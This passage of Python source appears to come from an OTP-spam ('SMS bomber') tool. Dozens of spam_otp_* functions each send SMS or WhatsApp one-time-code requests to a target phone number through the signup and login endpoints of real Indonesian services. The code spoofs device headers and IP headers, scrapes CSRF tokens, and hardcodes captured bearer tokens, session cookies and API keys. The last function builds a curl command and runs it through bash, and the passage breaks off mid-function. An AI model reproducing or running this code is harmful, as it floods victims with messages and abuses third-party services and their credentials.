        models = ['SM-S928B', 'SM-G965N', 'SM-N975F', 'SM-A515F', 'SM-M127F', 'Infinix X6532C', 'Redmi Note 10', 'POCO X3', 'vivo 2007', 'OPPO CPH2083']
        model = random.choice(models)
        
        versions = ['2.4.7', '2.4.8', '2.4.9', '2.5.0', '2.5.1']
        versionName = random.choice(versions)
        versionCode = versionName.replace('.', '')
        
        systemVersions = ['11', '12', '13', '14']
        systemVersion = random.choice(systemVersions)
        
        appsflyer_id = str(int(time.time() * 1000)) + '-' + str(random.randint(1000000000000000000, 9999999999999999999))
        
        session = requests.Session()
        
        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'User-Agent': f'Mozilla/5.0 (Linux; Android {systemVersion}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36'
        }
        
        url = f'https://api102.singa.id/new/login/sendWaOtp?versionName={versionName}&versionCode={versionCode}&model={model}&systemVersion={systemVersion}&platform=android&appsflyer_id={appsflyer_id}'
        
        payload = {
            'mobile_phone': nomor,
            'type': 'mobile',
            'is_switchable': 1
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return spam_otp_nilai(resp.text, '"msg":"', '"') == 'Success'
    except:
        return False
       
def spam_otp_planetban(nomor):
     try:

        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        elif nomor.startswith("+"):
            nomor_lokal = "0" + nomor[3:] if nomor.startswith("+62") else "0" + nomor[1:]
        elif nomor.startswith("0"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "0" + nomor
        
        import random
        import string
        random_name = f"User{random.randint(100,999)}"
        random_password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        
        session = requests.Session()
        url = "https://api.planetban.com/website/customer/request-otp"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://planetban.com',
            'Referer': 'https://planetban.com/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*'
        }
        
        payload = {
            "name": random_name,
            "phone": nomor_lokal,
            "password": random_password,
            "purpose": "register",
            "method": "whatsapp"
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
       
        if resp.status_code == 200:
            data = resp.json()
            if data.get("status") == True or data.get("success") == True or "success" in str(data).lower():
                return True
            else:
                return False
        else:
            return False
            
     except Exception as e:
        return False
      
def spam_otp_bunda(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = "62" + nomor[1:]
        elif nomor.startswith("+"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "62" + nomor
        
        session = requests.Session()
        url = "https://cms.bunda.co.id/api/v1/auth/send-otp"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://www.bunda.co.id',
            'x-locale': 'id',
            'Referer': 'https://www.bunda.co.id/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {
            "phone_number": int(nomor_lokal),
            "type": "auth"
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False
       
def spam_otp_bonusbelanja(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = "62" + nomor[1:]
        elif nomor.startswith("+"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "62" + nomor
        
        session = requests.Session()
        url = "https://www.bonusbelanja.com/api/auth/registration/app"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://www.bonusbelanja.com',
            'Referer': 'https://www.bonusbelanja.com/register/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {
            "phone": nomor_lokal,
            "name": "User",
            "agreeTnc": True,
            "agreeContact": True
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False
       
def spam_otp_hijup(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = "62" + nomor[1:]
        elif nomor.startswith("+"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "62" + nomor
        
        session = requests.Session()
        url = "https://www.hijup.com/sign_in"
        
        headers = {
            'Content-Type': 'text/plain;charset=UTF-8',
            'Origin': 'https://www.hijup.com',
            'next-action': 'b7eda6e749fbadcfcf226c2e36865091520b679f',
            'next-router-state-tree': '%5B%22%22%2C%7B%22children%22%3A%5B%5B%22merchant%22%2C%22hijup%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22sign_in%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
            'next-url': '/sign_in',
            'Referer': 'https://www.hijup.com/sign_in',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        payload = f'[{{"phone_number":"{nomor_lokal}","store_path":"hijup"}}]'
        
        resp = session.post(url, data=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False
    
def spam_otp_alodokter_sms(nomor):
    try:
        if nomor.startswith('0'):
            nomor_lokal = nomor
        elif nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        else:
            nomor_lokal = '0' + nomor
        
        raw = nomor_lokal[1:] if nomor_lokal.startswith('0') else nomor_lokal
        
        uuid_val = str(uuid.uuid4())
        
        session = requests.Session()
        url = "https://www.alodokter.com/resend-otp"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://www.alodokter.com',
            'x-csrf-token': 'Q40kfZBa/+ipTHv2irApJ9WBV3zSw8C55llxXbw+qPmG6LrCzTXxJaxKV1mQpLLXp0XpOkmYZBSjgVV2a+itPg==',
            'Referer': f'https://www.alodokter.com/otp_phone_number?type=register&phone={raw}',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin'
        }
        
        payload = {
            "user": {
                "phone": nomor_lokal,
                "uuid": uuid_val
            },
            "request_via": "sms"
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def spam_otp_alodokter(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = nomor
        elif nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = "0" + nomor
        
        raw = nomor_lokal[1:] if nomor_lokal.startswith("0") else nomor_lokal
        
        import uuid
        uuid_val = str(uuid.uuid4())
        
        session = requests.Session()
        url = "https://www.alodokter.com/resend-otp"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://www.alodokter.com',
            'x-csrf-token': 'o/FdMeWMEtf5/jbtImqJr9Wuau4r9I/boJAwEcUQv3x+WGzrnGnjY3WdVSdd9P2FVrx17l4r02I7VLEjCYoPrg==',
            'Referer': f'https://www.alodokter.com/otp_phone_number?type=register&phone={raw}',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {
            "user": {
                "phone": nomor_lokal,
                "uuid": uuid_val
            },
            "request_via": "whatsapp"
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False
       
       
def spam_otp_optikmelawai(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = "62" + nomor[1:]
        elif nomor.startswith("+"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "62" + nomor
        
        session = requests.Session()
        url = "https://api.optikmelawai.com/api/v3/auth/register/1"
        
        headers = {
            'authorization': 'Bearer a6a84b1f1e604d683fbef2295c2262373eba254197a1e14ab3a1e95a4394e4debf13560e5dbd66ab1e628aa3e73d3667d11f083077e562169b78d2ef2f3d285542a22f5ae174badd1313593deb5ec4389c75de38055b4964969a8323f031d47a6b35b3af4a096a08d6dddc2bf616c36bbeea1602b5b8a041650909107c207ed9',
            'x-unique-user': 'GA1.1.1062236172.1780823549',
            'language': 'id',
            'Origin': 'https://www.optikmelawai.com',
            'Referer': 'https://www.optikmelawai.com/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        data = {
            "phone_number": nomor_lokal,
            "name": "User",
            "email": f"user{random.randint(100000,999999)}@gmail.com",
            "password": "Test123",
            "password_confirmation": "Test123"
        }
        
        resp = session.post(url, data=data, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False
       

def spam_otp_jembatani(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = nomor
        elif nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = "0" + nomor
        
        import random
        import string
        rand_name = 'User' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
        rand_pass = "Test@" + ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + "#1"
        
        session = requests.Session()
        url = "https://api.jembatani.co.id/v1/register"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://jembatani.co.id',
            'Referer': 'https://jembatani.co.id/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {
            "phone": nomor_lokal,
            "name": rand_name,
            "password": rand_pass
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False

def spam_otp_rcx(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor[2:]
        else:
            nomor_lokal = nomor
        
        import random
        import string
        rand_name = 'User' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
        rand_email = f'user{random.randint(1000,9999)}@mailnesia.com'
        
        session = requests.Session()
        url = "https://sso.rcx.co.id/auth/passwordless/request"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://sso.rcx.co.id',
            'Referer': 'https://sso.rcx.co.id/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {
            "phone": nomor_lokal,
            "name": rand_name,
            "email": rand_email
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False

def spam_otp_sahabatteknisi(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor[2:]
        else:
            nomor_lokal = nomor
        
        session = requests.Session()
        url = "https://www.sahabatteknisi.co.id/api/auth/otp/check-phone"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://www.sahabatteknisi.co.id',
            'Referer': 'https://www.sahabatteknisi.co.id/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {"phone": nomor_lokal}
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False
       
def spam_otp_liva(nomor):
     try:

        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif not nomor.startswith('62'):
            nomor = '62' + nomor


        device_id = str(uuid.uuid4())
        device_name = random.choice(['Samsung', 'Xiaomi', 'Realme', 'Oppo', 'Vivo', 'OnePlus'])

        url = 'https://cms-2f7gt694.liva-auto.id/api/public/auth-ada/send-otp'
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-store',
            'content-type': 'application/json',
            'origin': 'https://liva-auto.id',
            'referer': 'https://liva-auto.id/',
            'user-agent': random.choice([
                'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36'
            ]),
            'x-app-version': '1.9.259',
            'x-device-id': device_id,
            'x-device-name': device_name,
            'x-platform': 'web'
        }
        payload = {
            'phoneNumber': nomor
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

     except Exception as e:
        return False

def spam_otp_daihatsu(nomor):
     try:

        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif not nomor.startswith('62'):
            nomor = '62' + nomor

        session = requests.Session()
        resp_page = session.get(
            'https://www.astra-daihatsu.id/register',
            headers={'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'},
            timeout=10
        )

        import re
        csrf_match = re.search(r'CSRFToken.*?value=\"([^\"]+)\"', resp_page.text)
        if not csrf_match:
            return False
        csrf = csrf_match.group(1)

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/json; charset=UTF-8',
            'csrftoken': csrf,
            'origin': 'https://www.astra-daihatsu.id',
            'referer': 'https://www.astra-daihatsu.id/register',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin'
        }

        resp = session.post(
            'https://www.astra-daihatsu.id/otp/whatsapp/generate',
            json={'phoneNo': nomor},
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400

     except Exception:
        return False

def spam_otp_kreditpintar(nomor):
     try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        elif not nomor.startswith('+62'):
            nomor = '+62' + nomor

        uuid_val = str(__import__('uuid').uuid4())
        session = requests.Session()
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'id',
            'content-type': 'application/json',
            'origin': 'https://go.kreditpintar.com',
            'referer': f'https://go.kreditpintar.com/OFFICIAL2021/code-step?m={nomor}',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-adv-market-channel': 'OfficialWebsite',
            'x-adv-uuid': uuid_val,
            'x-app-version': 'APPVERSION_NAME(9999)',
            'x-os-type': 'WEB',
            'x-user-agent': f'Pintar-ID-Cash (WebAndroid;;;id) uuid/{uuid_val} version/0.1.0'
        }

        resp = session.post(
            'https://go.kreditpintar.com/api/auth/send-code?channel=OFFICIAL2021&lang=id',
            json={'mobileNumber': nomor, 'type': 'SMS'},
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400

     except Exception:
        return False

def spam_otp_internetrakyat(nomor):
     try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]

        session = requests.Session()
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Origin': 'https://internetrakyat.id',
            'Referer': 'https://internetrakyat.id/auth/register',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-api-key': '280999!FTTH'
        }

        resp = session.post(
            'https://internetrakyat.id/api/app/auth/send-otp-register',
            json={'phone_number': nomor},
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400

     except Exception:
        return False

def spam_otp_pinjamduit(nomor):
     try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]


        session = requests.Session()
        BASE = 'https://api.pinjamduit.co.id'

        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': BASE,
            'Referer': BASE + '/h5/download_selfmedia.html'
        }

        r1 = session.post(
            BASE + '/gw/loan/credit-user/checkPhoneWeb',
            headers=headers,
            data={
                'phone': nomor,
                'mobilePhone': nomor,
                'uuid': str(uuid.uuid4()),
                'deviceId': 'wh',
                'appMarket': 'web',
                'appVersion': '99.99.99',
                'clientType': 'w',
                'ts': int(time.time() * 1000)
            },
            timeout=10
        )

        res1 = r1.json()
        if res1.get('code') != '0':
            return False

        wybs = res1['data']['wybs']
        sms_useage = 10 if res1['data']['isExist'] == 1 else 0

        headers2 = headers.copy()
        headers2['ss'] = wybs

        r2 = session.post(
            BASE + '/gw/loan/credit-user/checkPhoneNext',
            headers=headers2,
            data={
                'phone': nomor,
                'mobilePhone': nomor,
                'sms_service': 2,
                'sms_useage': sms_useage,
                'deviceId': 'wh',
                'appMarket': 'web',
                'appVersion': '99.99.99',
                'clientType': 'w',
                'ts': int(time.time() * 1000)
            },
            timeout=10
        )

        res2 = r2.json()
        return res2.get('code') == '0'

     except Exception:
        return False

def spam_otp_isellershop(nomor):
     try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]

        headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://warungyeahbintan.isellershop.com',
            'referer': 'https://warungyeahbintan.isellershop.com/register',
            'x-requested-with': 'XMLHttpRequest',
            'x-sat': 'oCQ4sBq2nu1Bh9S3Vo7r8vImrDsZ+dvgZNzwSwJyCiI=',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
        }

        resp = requests.post(
            'https://warungyeahbintan.isellershop.com/services/identity/requestOTP',
            headers=headers,
            data={'destination': nomor, 'otpLength': '10'},
            timeout=10
        )

        return resp.status_code < 400

     except Exception:
        return False

def spam_otp_greensm(nomor):
     try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        elif not nomor.startswith('+62'):
            nomor = '+62' + nomor

        headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
        }

        payload = {
            'HiringSource': 'Iklan di surat kabar atau dalam aplikasi',
            'Education': 's2',
            'WorkExperience': 'Sopir komersial',
            'City': 'BT',
            'Type': 'CAR_SHARING',
            'Tel': nomor,
            'Name': 'Budi Santoso',
            'Country': 'ID',
            'ReferralCode': '',
            'Source': '',
            'AffiliateNumber': '',
            'Campaign': ''
        }

        resp = requests.post(
            'https://gapi.indo.greensm.com/car/acquisition/create-registration',
            headers=headers,
            json=payload,
            timeout=10
        )

        return resp.status_code < 400

     except Exception:
        return False

def spam_otp_tiptip(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        elif nomor.startswith('+62'):
            nomor = nomor
        else:
            nomor = '+62' + nomor

        import random
        import string
        
        def generate_ip():
            return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        def generate_request_id():
            return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        session = requests.Session()
        
        ip_address = generate_ip()
        request_id = generate_request_id()

        headers = {
            'accept': 'application/json',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'channel': 'WEB',
            'channel-app-version': '2.27.19',
            'channel-device': 'Chrome',
            'channel-fingerprint': '19f1c525c6b48e-0b8928afc7222d8-26061051-15f900-19f1c525c6b48f',
            'channel-fingerprint-additional': '0a9fb6659a3eadf58d9f3ea38e0c17e9',
            'content-type': 'application/json',
            'country-code': 'ID',
            'ip-address': ip_address,
            'language': 'id',
            'origin': 'https://tiptip.id',
            'priority': 'u=1, i',
            'referer': 'https://tiptip.id/sign-up?ref=%2F',
            'request-id': request_id,
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'x-queueit-ajaxpageurl': 'https%3A%2F%2Ftiptip.id%2Fsign-up%3Fref%3D%252F'
        }

        payload = {
            "action": "SIGN_UP",
            "delivery_method": "WA",
            "phone_number": nomor
        }

        url = 'https://api.tiptip.id/authentication/guest/v1/phone/otp/send'
        resp = session.post(url, json=payload, headers=headers, timeout=10)

        if resp.status_code == 200:
            try:
                data = resp.json()
                return data.get('status') == 'success' or data.get('success') == True
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_dokterin(nomor):
     try:
        if nomor.startswith('62'):
            nomor_format = nomor
        elif nomor.startswith('0'):
            nomor_format = '62' + nomor[1:]
        else:
            nomor_format = '62' + nomor

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/json',
            'Origin': 'https://partner.dokterin.co.id',
            'Referer': 'https://partner.dokterin.co.id/',
            'x-api-platform': 'eyJhcHBfdmVyc2lvbiI6IjEuMC4wIiwicGxhdGZvcm0iOiJ3ZWIiLCJtYW51ZmFjdHVyZXIiOiJCbGluayIsInByb2R1Y3QiOiJXZWIgQnJvd3NlciIsImRlc2NyaXB0aW9uIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0Ny4wLjAuMCBTYWZhcmkvNTM3LjM2IiwidGltZXpvbmUiOiJBc2lhL0pha2FydGEifQ==',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'Connection': 'keep-alive'
        }

        payload = {
            'phone': nomor_format,
            'tnc_accept': True,
            'device': 'Blink',
            'platform': 'web',
            'host': 'https://partner.dokterin.co.id'
        }

        resp = requests.post(
            'https://api.dokterin.id/user/v1/users/login',
            json=payload,
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400

     except Exception:
        return False

def spam_otp_speedcash(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor

        import subprocess
        import json

        cookie_string = 'page=eyJpdiI6IlZpNTBMa05CaTJ5MjdlMFJOQTZuc0E9PSIsInZhbHVlIjoieGZiU0l1Z0lpcFI4WG9XbmlxOTRqdz09IiwibWFjIjoiMWVkZTIzNjdiYzI4MzkwYjcwMWUxOWUzNmNjOTllZmEwN2RlMDg5OTRjZWVlYzM5YjE5ZGUzZTBhMjBhMDY2NyJ9; _gcl_au=1.1.179635825.1783143670; _tt_enable_cookie=1; _ttp=01KWNTA9MFMPRKVN4403SGAP5F_.tt.2; ttcsid_BQG0RGGAC2KB0QR0PJOG=1783143671475::ZLlEKb52-DZYiqWjJ88b.1.1783143675625.0; ttcsid=1783143671481::o8HHyHxWOtSV_vWa1vCw.1.1783143675625.0::1.-4236.0::4170.4.255.361::0.0.0; XSRF-TOKEN=eyJpdiI6Iklyblg2RStMZzBFdTVQQzhzcmZpaEE9PSIsInZhbHVlIjoidmNhYkJHR3pyWTZpQ0tJMm90dTRXc2tkbUI1eWxjeFBKWEJ5TG9iaXhMK045QU1MR0JvYks5K2VaZnluclplRCIsIm1hYyI6ImJiNTlmMjEzYWExNWEwZjQzYjkzN2Q5MjllZDJkNmQ2NWMxNzk4MTY5MjRhYWYzYTY5YTIwMmZhZGMyMDhiNDcifQ%3D%3D; speedcash_session=eyJpdiI6ImJSVG5LSmd6XC9LTHNNYkszUmlBMUx3PT0iLCJ2YWx1ZSI6InpVRnl6WXB6V0FyRjM0RUxYajRcL2ZaMFlOMmNSSDVWNlRmYjQrWlg3VVpLbU01TngrNU5tMXJ4TnkwcTRzdmNrIiwibWFjIjoiZTY2NDc4OTNhYWIxZDc2NTE5NmI1YTg5NjI4N2Y3MDI1Y2FkZjdlYWM0NTZjMjA4MGM1YmIwYzFlMGZmNWE0NyJ9; x-csrf-token=6411dfb2d7c1403d4691c542a1c68512dafd6de7a48220cd54aab8939a6b56e7cc9312b0fa328e5d4c0215b86f8c41fe6258dc59183fc204079a7ae4f91fbee9%7C8fb4ac768bd6142694240b43d8426637f61dfa32690ad4a48c0d0546ea804f81'

        xsrf_token = 'eyJpdiI6Iklyblg2RStMZzBFdTVQQzhzcmZpaEE9PSIsInZhbHVlIjoidmNhYkJHR3pyWTZpQ0tJMm90dTRXc2tkbUI1eWxjeFBKWEJ5TG9iaXhMK045QU1MR0JvYks5K2VaZnluclplRCIsIm1hYyI6ImJiNTlmMjEzYWExNWEwZjQzYjkzN2Q5MjllZDJkNmQ2NWMxNzk4MTY5MjRhYWYzYTY5YTIwMmZhZGMyMDhiNDcifQ=='

        authorization = 'Bearer YzZmNDM2YzliYjVkMDE1Y2I4MDhmYjFlMjY5NDA3MTgwYmEzMWQ1NmNjZjNmMzQ1Yjc2NTM1MDIyZTFlMDUwY2ZmMTY5MzVmZTMyZjIyOTM2ZmNmZjZhZmM4MDRhNjM2'

        payload = json.dumps({
            "version_name": "3.2.0",
            "version_code": "270",
            "uuid": "0489f8f6-49cd-5a10-9fae-7e1297fdd015",
            "user_uuid": "0489f8f6-49cd-5a10-9fae-7e1297fdd015",
            "via": "BB MOBILE WEB",
            "app_id": "SPEEDCASH",
            "appid": "SPEEDCASH",
            "location": "0,0",
            "phone": phone,
            "state": "REGISTER",
            "type": "WA"
        })

        curl_otp = f'''curl -s -X POST 'https://member.speedcash.co.id/api/twice/otp/generate' \\
  -H 'authorization: {authorization}' \\
  -H 'content-type: application/json' \\
  -H 'cookie: {cookie_string}' \\
  -H 'origin: https://member.speedcash.co.id' \\
  -H 'referer: https://member.speedcash.co.id/' \\
  -H 'sec-ch-ua: "Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-site: same-origin' \\
  -H "time-request: $(date +%s%3N)" \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36' \\
  -H 'x-csrf-token: 6411dfb2d7c1403d4691c542a1c68512dafd6de7a48220cd54aab8939a6b56e7cc9312b0fa328e5d4c0215b86f8c41fe6258dc59183fc204079a7ae4f91fbee9' \\
  -H 'x-xsrf-token: {xsrf_token}' \\
  -d '{payload}' '''

        result = subprocess.run(['bash', '-c', curl_otp], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                return data.get('rc') == '00'
